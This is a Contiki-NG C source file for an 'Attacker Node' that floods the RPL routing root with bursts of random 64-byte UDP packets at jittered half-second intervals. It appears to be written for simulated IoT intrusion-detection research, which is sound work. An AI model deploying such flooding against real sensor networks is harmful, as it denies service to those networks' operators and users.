#include "contiki.h"
#include "net/routing/routing.h"
#include "random.h"
#include "net/netstack.h"
#include "net/ipv6/simple-udp.h"
#include "sys/log.h"
#include "project-conf.h"

#define LOG_MODULE "Attack"
#define LOG_LEVEL LOG_LEVEL_INFO

#define ATTACK_PAYLOAD_SIZE 64
#define ATTACK_BURST_SIZE 3
#define INITIAL_DELAY (CLOCK_SECOND * 10)
#define ATTACK_INTERVAL (CLOCK_SECOND / 2)

static struct simple_udp_connection udp_conn;
static uint32_t tx_count = 0;
static char attack_payload[ATTACK_PAYLOAD_SIZE];

/*---------------------------------------------------------------------------*/
PROCESS(attacker_node_process, "Attacker Node");
AUTOSTART_PROCESSES(&attacker_node_process);

/*---------------------------------------------------------------------------*/
static void generate_payload(void) {
    static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    for(int i = 0; i < ATTACK_PAYLOAD_SIZE - 1; i++) {
        attack_payload[i] = charset[random_rand() % (sizeof(charset) - 1)];
    }
    attack_payload[ATTACK_PAYLOAD_SIZE - 1] = '\0';
}

/*---------------------------------------------------------------------------*/
PROCESS_THREAD(attacker_node_process, ev, data)
{
    static struct etimer attack_timer;
    uip_ipaddr_t dest_ipaddr;

    PROCESS_BEGIN();

    // Initialize UDP connection
    simple_udp_register(&udp_conn, UDP_CLIENT_PORT, NULL,
                       UDP_SERVER_PORT, NULL);

    // Initial delay to let network stabilize
    etimer_set(&attack_timer, INITIAL_DELAY);
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&attack_timer));

    // Generate initial attack payload
    generate_payload();

    while(1) {
        if(NETSTACK_ROUTING.node_is_reachable() &&
           NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {

            // Send burst of attack packets
            for(int i = 0; i < ATTACK_BURST_SIZE && tx_count < 1000; i++) {
                LOG_INFO("Attack packet %"PRIu32" to ", tx_count);
                LOG_INFO_6ADDR(&dest_ipaddr);
                LOG_INFO_("\n");
                
                simple_udp_sendto(&udp_conn, attack_payload, 
                                strlen(attack_payload), &dest_ipaddr);
                tx_count++;

                // Regenerate payload every 10 packets
                if(tx_count % 10 == 0) {
                    generate_payload();
                }
            }
        }

        // Add small random jitter to the interval (±25%)
        etimer_set(&attack_timer, ATTACK_INTERVAL + 
                  (random_rand() % (ATTACK_INTERVAL / 2)) - (ATTACK_INTERVAL / 4));
        PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&attack_timer));
    }

    PROCESS_END();
}
